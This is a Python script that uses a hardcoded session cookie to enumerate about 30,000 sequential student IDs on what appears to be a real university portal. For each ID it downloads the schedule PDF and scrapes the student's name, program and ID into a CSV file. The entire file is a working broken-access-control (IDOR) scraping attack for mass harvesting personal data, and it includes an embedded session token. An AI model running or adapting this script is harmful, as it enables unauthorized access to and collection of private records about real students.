import urllib.request
import PyPDF2
import re
import csv
import os.path as fileCheck
from os import remove as fileRem

stop = False

def getData(jsesID,servID='1684732',timeID='627120',file='data.pdf'):
    try:
        url = 'https://usis.bracu.ac.bd/academia/studentCourse/createSchedulePDF?content=pdf&studentId='+str(servID)+'&sessionId='+str(timeID)
        cookie = 'JSESSIONID='+str(jsesID)+';SRVNAME=USISA'
        opener = urllib.request.build_opener()
        opener.addheaders.append(('Cookie', cookie))
        urllib.request.install_opener(opener)
        urllib.request.urlretrieve(url, file)
        return True
    except:
        return False

def parseData(file='data.pdf'):
    try:
        pdf_file = open(file, 'rb')
        pdf_reader = PyPDF2.PdfReader(pdf_file)
        page = pdf_reader.pages[0]
        text = page.extract_text()
        nm = re.search("Name : .+", text).group()[7:]
        pg = re.search("Program: [A-Z]+", text).group()[9:]
        id = re.search("ID : [0-9]+", text).group()[5:]
        pdf_file.close()
        return [id,pg,nm]
    except:
        return False

def storeData(sid,id,pg,name,dataname='data.csv'):
    with open(dataname, 'a') as csvfile:
        csvwriter = csv.writer(csvfile)
        csvwriter.writerow([sid,id,pg,name])

start=1669207
steps=30000
sessionID='97CC31CF14E6D3AB3640A0E3CEF73929'


for i in range(start,start+steps):
    if fileCheck.exists('killme'):
        fileRem('killme')
        break
    print("---------------")
    print("Getting Data",i,i-start)
    try:
        getData(sessionID,i)
        data = parseData()
        id,pg,nm = parseData()
        storeData(i,id,pg,nm)
        print("Data Parsed")
    except:
        print("Failed Parsing")
    if fileCheck.exists('data.pdf'):
        fileRem('data.pdf')
